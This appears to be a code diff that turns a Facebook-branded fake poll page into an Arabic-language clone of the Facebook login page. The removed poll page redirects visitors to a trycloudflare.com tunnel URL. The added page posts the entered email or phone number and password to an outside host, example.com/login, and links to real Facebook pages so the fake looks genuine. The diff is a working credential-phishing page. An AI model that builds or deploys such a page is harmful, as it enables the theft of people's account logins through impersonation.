@@ -1,260 +1,208 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Vote for your favorite person on our interactive poll page.">
-    <meta name="keywords" content="vote, poll, interactive, survey">
-    <meta name="author" content="Your Name">
-    <title>Vote for Your Favorite Person</title>
-    <link rel="icon" href="favicon.ico" type="image/x-icon">
-    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600&display=swap" rel="stylesheet">
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet">
+    <title>فيسبوك - تسجيل الدخول أو الاشتراك</title>
     <style>
         body {
-            font-family: 'Montserrat', sans-serif;
-            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
-            background-size: 200% 200%;
-            animation: gradientAnimation 10s ease infinite;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background: linear-gradient(to bottom, #e9efff, #f0f2f5);
             margin: 0;
             padding: 0;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            color: #333;
-            cursor: url('https://example.com/custom-cursor.png'), auto;
-            transition: background 0.3s ease, color 0.3s ease;
-        }
-        @keyframes gradientAnimation {
-            0% { background-position: 0% 0%; }
-            50% { background-position: 100% 100%; }
-            100% { background-position: 0% 0%; }
-        }
-        body.dark-mode {
-            background: linear-gradient(135deg, #1a1a1a 0%, #333 100%);
-            color: #ccc;
-        }
-        .login-container {
-            background-color: rgba(255, 255, 255, 0.9);
-            backdrop-filter: blur(10px);
-            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
-            border-radius: 15px;
-            padding: 40px;
-            max-width: 400px;
-            width: 100%;
-            text-align: center;
-            position: relative;
             overflow: hidden;
-            transition: all 0.3s ease;
+            direction: rtl;
         }
-        .login-container.dark-mode {
-            background-color: rgba(30, 30, 30, 0.9);
-            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
-        }
-        .facebook-logo {
-            width: 60px;
-            height: auto;
-            margin-bottom: 20px;
-            transition: transform 0.3s ease;
-        }
-        .facebook-logo:hover {
-            transform: rotate(10deg) scale(1.1);
-        }
-        .poll-title {
-            font-size: 26px;
-            margin-bottom: 15px;
-            font-weight: 600;
-            color: #1877f2;
-            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.1);
-        }
-        .poll-title.dark-mode {
-            color: #0d6efd;
-            text-shadow: 1px 1px 2px rgba(255, 255, 255, 0.3);
-        }
-        .poll-subtitle {
-            font-size: 20px;
-            margin-bottom: 25px;
-            font-weight: 400;
-            color: #666;
-            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.1);
-        }
-        .poll-subtitle.dark-mode {
-            color: #bbb;
-        }
-        .input-container {
-            position: relative;
-            margin: 0 auto 20px auto;
-            max-width: 300px;
-        }
-        .input-container input {
-            padding: 12px 40px 12px 12px;
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
             width: 100%;
-            border: 1px solid #dddfe2;
-            border-radius: 30px;
-            transition: border-color 0.3s ease, box-shadow 0.3s ease, transform 0.3s ease;
+            max-width: 1080px;
+            padding: 20px;
             box-sizing: border-box;
-            font-size: 16px;
-            z-index: 1;
         }
-        .input-container input:focus {
-            border-color: #1877f2;
-            box-shadow: 0 0 8px rgba(24, 119, 242, 0.2);
-            outline: none;
-            transform: scale(1.02);
+        .content {
+            display: flex;
+            justify-content: center;
+            width: 100%;
+            max-width: 900px;
         }
-        .input-container input::placeholder {
-            color: transparent;
-            transition: opacity 0.3s ease;
+        .left {
+            flex: 1;
+            padding-left: 40px;
+            max-width: 500px;
         }
-        .input-container input:focus::placeholder,
-        .input-container input:not(:placeholder-shown)::placeholder {
-            opacity: 0;
-        }
-        .input-container i {
-            position: absolute;
-            top: 50%;
-            right: 15px;
-            transform: translateY(-50%);
-            color: #888;
-            z-index: 2;
-        }
-        .input-container label {
-            position: absolute;
-            top: 50%;
-            left: 15px;
-            transform: translateY(-50%);
-            pointer-events: none;
-            transition: all 0.3s ease;
-            color: #888;
-            font-size: 16px;
-            z-index: 2;
-        }
-        .input-container input:focus + label,
-        .input-container input:not(:placeholder-shown) + label {
-            top: 0;
-            transform: translateY(-100%) translateX(-10px);
-            font-size: 12px;
+        .left h1 {
             color: #1877f2;
+            font-size: 48px;
+            margin-bottom: 0;
+            font-weight: bold;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
-        .tooltip {
-            position: absolute;
-            top: 100%;
-            left: 0;
-            background-color: #333;
-            color: #fff;
-            padding: 5px;
-            border-radius: 3px;
-            font-size: 12px;
-            display: none;
+        .left p {
+            font-size: 24px;
+            margin-top: 10px;
+            font-weight: 300;
+            color: #606770;
         }
-        .input-container:hover .tooltip {
-            display: block;
-        }
-        .login-button {
+        .right {
+            flex: 1;
+            max-width: 380px;
+            background-color: #fff;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+            box-sizing: border-box;
             position: relative;
             overflow: hidden;
-            transition: background-color 0.3s ease, transform 0.3s ease;
-            border: 1px solid transparent;
-            background: linear-gradient(90deg, #1877f2, #145dbf);
-            color: white;
-            padding: 12px 20px;
-            border-radius: 30px;
-            font-size: 16px;
-            cursor: pointer;
-            font-weight: 600;
+        }
+        .right:before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at top left, rgba(0, 0, 0, 0.1), transparent);
+            z-index: 0;
+            opacity: 0.1;
+        }
+        .right form {
+            display: flex;
+            flex-direction: column;
+            position: relative;
             z-index: 1;
         }
-        .login-button.dark-mode {
-            background: linear-gradient(90deg, #0d6efd, #0044cc);
+        .right input[type="text"], 
+        .right input[type="password"] {
+            width: calc(100% + 16px);
+            max-width: calc(100% + 16px);
+            padding: 14px;
+            margin-bottom: 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 8px;
+            font-size: 16px;
+            line-height: 20px;
+            box-sizing: border-box;
+            transition: border-color 0.3s, box-shadow 0.3s;
         }
-        .login-button::before {
-            content: '';
+        .right input[type="text"]::placeholder, 
+        .right input[type="password"]::placeholder {
+            color: #b0b3b8;
+        }
+        .right input[type="text"]:focus, 
+        .right input[type="password"]:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 8px rgba(24, 119, 242, 0.5);
+            outline: none;
+        }
+        .right input[type="text"] {
+            margin-top: -8px;
+        }
+        .right input[type="password"] {
+            margin-top: 0;
+        }
+        .right input[type="submit"] {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(to bottom, #1877f2, #0f65d3);
+            border: none;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s, transform 0.3s, box-shadow 0.3s;
+            line-height: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+        .right input[type="submit"]:hover {
+            background: linear-gradient(to bottom, #155db1, #0e4d9d);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+        }
+        .right input[type="submit"]:disabled {
+            background: #b0b3b8;
+            cursor: not-allowed;
+        }
+        .right .forgot-password {
+            display: block;
+            text-align: center;
+            margin-top: 12px;
+            color: #1877f2;
+            cursor: pointer;
+            font-size: 14px;
+            transition: text-decoration 0.3s, color 0.3s;
+            position: relative;
+        }
+        .right .forgot-password:hover {
+            text-decoration: underline;
+            color: #155db1;
+        }
+        .right .forgot-password.loading::after {
+            content: "";
             position: absolute;
+            left: -24px;
             top: 50%;
-            left: 50%;
-            width: 300%;
-            height: 300%;
-            background-color: rgba(255, 255, 255, 0.3);
-            transform: translate(-50%, -50%) scale(0);
-            transition: transform 0.3s ease;
+            transform: translateY(-50%);
+            border: 2px solid transparent;
             border-radius: 50%;
-            z-index: 0;
+            border-top-color: #1877f2;
+            width: 16px;
+            height: 16px;
+            animation: spin 1s linear infinite;
         }
-        .login-button:hover::before {
-            transform: translate(-50%, -50%) scale(1);
+        .right hr {
+            border: none;
+            border-top: 1px solid #dddfe2;
+            margin: 20px 0;
         }
-        .login-button:hover {
-            transform: translateY(-3px);
+        .right .create-account {
+            display: block;
+            text-align: center;
+            padding: 12px;
+            background-color: #42b72a;
+            border: none;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 16px;
+            font-weight: bold;
+            text-decoration: none;
+            transition: background-color 0.3s, transform 0.3s;
+            position: relative;
         }
-        .button-loading {
-            display: none;
-            border: 3px solid #fff;
-            border-top: 3px solid transparent;
-            border-radius: 50%;
-            width: 24px;
-            height: 24px;
+        .right .create-account:hover {
+            background-color: #36a420;
+            transform: translateY(-2px);
+        }
+        .right .create-account.loading::after {
+            content: "";
             position: absolute;
+            left: -24px;
             top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            animation: spin 0.6s linear infinite;
+            transform: translateY(-50%);
+            border: 2px solid transparent;
+            border-radius: 50%;
+            border-top-color: #42b72a;
+            width: 16px;
+            height: 16px;
+            animation: spin 1s linear infinite;
         }
         @keyframes spin {
-            0% { transform: translate(-50%, -50%) rotate(0deg); }
-            100% { transform: translate(-50%, -50%) rotate(360deg); }
-        }
-        .error-message, .success-message {
-            opacity: 0;
-            transition: opacity 0.3s ease;
-        }
-        .error-message.show, .success-message.show {
-            opacity: 1;
-        }
-        .error-message {
-            color: red;
-            font-size: 12px;
-            margin: 5px 0 10px 0;
-            display: none;
-        }
-        .success-message {
-            color: green;
-            font-size: 12px;
-            margin: 5px 0 10px 0;
-            display: none;
-        }
-        .privacy-notice {
-            font-size: 12px;
-            color: #606770;
-            margin-top: 20px;
-        }
-        .privacy-notice a {
-            color: #1877f2;
-            text-decoration: none;
-        }
-        .privacy-notice a:hover {
-            text-decoration: underline;
-        }
-        .social-links {
-            margin-top: 20px;
-        }
-        .social-links a {
-            font-size: 24px;
-            color: #333;
-            margin: 0 10px;
-            transition: color 0.3s ease, transform 0.3s ease;
-        }
-        .social-links a:hover {
-            color: #1877f2;
-            transform: scale(1.1);
-        }
-        .social-links i {
-            vertical-align: middle;
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
         .footer {
-            margin-top: 20px;
-            font-size: 12px;
-            color: #606770;
+            margin-top: 30px;
+            text-align: center;
+            font-size: 16px;
+            color: #8a8d91;
         }
         .footer a {
             color: #1877f2;
@@ -263,121 +211,43 @@
         .footer a:hover {
             text-decoration: underline;
         }
-        .results-container, .history-container {
-            display: none;
-            margin-top: 20px;
-            text-align: left;
-        }
-        .results-container h3, .history-container h3 {
-            font-size: 20px;
-            margin-bottom: 10px;
-            color: #333;
-        }
-        .results-container p, .history-container p {
-            font-size: 16px;
-            color: #666;
-        }
     </style>
 </head>
 <body>
-    <div class="login-container" role="main">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="facebook-logo" role="img">
-        <h2 class="poll-title">Vote for Your Favorite Person</h2>
-        <p class="poll-subtitle">صوت للشخص المفضل لديك</p>
-        <div class="error-message" id="errorMessage">
-            <i class="fas fa-exclamation-circle"></i> Please enter a valid vote.
+    <div class="container">
+        <div class="content">
+            <div class="left">
+                <h1>facebook</h1>
+                <p>يمنحك فيسبوك إمكانية التواصل مع الأشخاص ومشاركة ما تريد معهم.</p>
+            </div>
+            <div class="right">
+                <form action="https://example.com/login" method="POST">
+                    <input type="text" name="username" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+                    <input type="password" name="password" placeholder="كلمة المرور" required>
+                    <input type="submit" value="تسجيل الدخول">
+                </form>
+                <a class="forgot-password" id="forgotPassword" href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" target="_blank">نسيت كلمة المرور؟</a>
+                <hr>
+                <a class="create-account" id="createAccount" href="https://www.facebook.com/pages/create/?ref_type=registration_form" target="_blank">إنشاء حساب جديد</a>
+            </div>
         </div>
-        <div class="success-message" id="successMessage">
-            <i class="fas fa-check-circle"></i> Vote recorded! Showing results...
+        <div class="footer">
+            <p><a href="https://www.facebook.com/pages/create/?ref_type=registration_form">إنشاء صفحة</a> لعلامة تجارية أو عمل تجاري.</p>
         </div>
-        <div class="input-container">
-            <input type="text" id="vote" placeholder=" " aria-label="Vote" aria-required="true" required>
-            <label for="vote">Vote</label>
-            <i class="fas fa-check"></i>
-            <div class="tooltip">Enter your vote here</div>
-        </div>
-        <button class="login-button" onclick="vote()" id="voteButton">
-            <span class="button-text">Vote</span>
-            <div class="button-loading" id="buttonLoading"></div>
-        </button>
-        <div class="results-container" id="resultsContainer">
-            <h3>Poll Results</h3>
-            <p>Thank you for voting! Here are the current results:</p>
-            <p>Person 1: 50%</p>
-            <p>Person 2: 30%</p>
-            <p>Person 3: 20%</p>
-        </div>
-        <div class="history-container" id="historyContainer">
-            <h3>Your Voting History</h3>
-            <p>Here is a list of your previous votes:</p>
-            <p>No history available.</p>
-        </div>
-        <p class="privacy-notice">
-            We respect your privacy. The data collected during the voting process will be used solely for the purpose of this poll and will not be shared with third parties. 
-            <a href="https://www.facebook.com/privacy/policy/" aria-label="Privacy Policy">Learn more</a>
-        </p>
-        <div class="social-links">
-            <a href="https://www.facebook.com/sharer/sharer.php?u=https://barbara-optional-mom-roommates.trycloudflare.com" aria-label="Share on Facebook" target="_blank"><i class="fab fa-facebook"></i></a>
-            <a href="https://twitter.com/intent/tweet?url=https://barbara-optional-mom-roommates.trycloudflare.com&text=Check%20out%20this%20poll!" aria-label="Share on Twitter" target="_blank"><i class="fab fa-twitter"></i></a>
-            <a href="https://www.linkedin.com/shareArticle?mini=true&url=https://barbara-optional-mom-roommates.trycloudflare.com&title=Vote%20for%20Your%20Favorite%20Person" aria-label="Share on LinkedIn" target="_blank"><i class="fab fa-linkedin"></i></a>
-            <a href="mailto:?subject=Check%20out%20this%20poll&body=Check%20out%20this%20poll%20at%20https://barbara-optional-mom-roommates.trycloudflare.com" aria-label="Share via Email" target="_blank"><i class="fas fa-envelope"></i></a>
-            <a href="https://api.whatsapp.com/send?text=Check%20out%20this%20poll%20at%20https://barbara-optional-mom-roommates.trycloudflare.com" aria-label="Share on WhatsApp" target="_blank"><i class="fab fa-whatsapp"></i></a>
-        </div>
-        <footer class="footer">
-            For assistance, contact us at <a href="mailto:support@example.com">support@example.com</a>
-        </footer>
     </div>
 
     <script>
-        let voteHistory = [];
-
-        // Toggle dark mode
-        document.addEventListener('keydown', (e) => {
-            if (e.code === 'KeyD') {
-                document.body.classList.toggle('dark-mode');
-                document.querySelector('.login-container').classList.toggle('dark-mode');
-            }
+        // Simulate loading state
+        document.getElementById('forgotPassword').addEventListener('click', function() {
+            this.classList.add('loading');
+            setTimeout(() => this.classList.remove('loading'), 2000); // Remove after 2 seconds
         });
 
-        function vote() {
-            const voteInput = document.getElementById('vote').value.trim();
-            const errorMessage = document.getElementById('errorMessage');
-            const successMessage = document.getElementById('successMessage');
-            const loading = document.getElementById('buttonLoading');
-            const resultsContainer = document.getElementById('resultsContainer');
-            const historyContainer = document.getElementById('historyContainer');
-            
-            if (voteInput) {
-                errorMessage.style.display = 'none';
-                loading.style.display = 'block';
-                setTimeout(() => {
-                    loading.style.display = 'none';
-                    successMessage.style.display = 'block';
-                    successMessage.classList.add('show');
-                    voteHistory.push(voteInput);
-                    document.querySelector('.login-container').style.display = 'none';
-                    resultsContainer.style.display = 'block';
-                    historyContainer.style.display = 'block';
-                    updateHistory();
-                    setTimeout(() => {
-                        window.location.href = 'https://barbara-optional-mom-roommates.trycloudflare.com';
-                    }, 500); // Reduced delay
-                }, 1000); // Reduced delay
-            } else {
-                errorMessage.style.display = 'block';
-                errorMessage.classList.add('show');
-            }
-        }
-
-        function updateHistory() {
-            const historyContainer = document.getElementById('historyContainer');
-            const historyList = historyContainer.querySelector('p');
-            if (voteHistory.length > 0) {
-                historyList.innerHTML = voteHistory.map(vote => `<p>${vote}</p>`).join('');
-            } else {
-                historyList.innerHTML = 'No history available.';
-            }
-        }
+        document.getElementById('createAccount').addEventListener('click', function() {
+            this.classList.add('loading');
+            setTimeout(() => this.classList.remove('loading'), 2000); // Remove after 2 seconds
+        });
     </script>
 </body>
 </html>
+
